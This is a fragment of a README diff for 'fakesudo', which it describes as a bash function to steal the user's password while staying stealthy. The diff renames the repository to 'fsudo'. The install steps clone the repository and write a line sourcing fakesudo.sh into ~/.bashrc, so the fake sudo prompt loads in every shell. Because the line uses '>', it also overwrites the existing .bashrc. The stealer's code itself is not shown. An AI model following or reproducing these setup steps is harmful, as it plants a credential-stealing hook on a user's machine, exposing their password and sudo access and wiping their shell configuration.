@@ -3,8 +3,8 @@ It's just a bash function to steal the users password, while trying to be stealt
 
 # Install
 ```bash
-git clone https://github.com/mthbernardes/fakesudo.git
-cd fakesudo
+git clone https://github.com/mthbernardes/fsudo.git
+cd fsudo
 echo "source `pwd`/fakesudo.sh" > /home/$USER/.bashrc
 ```
 
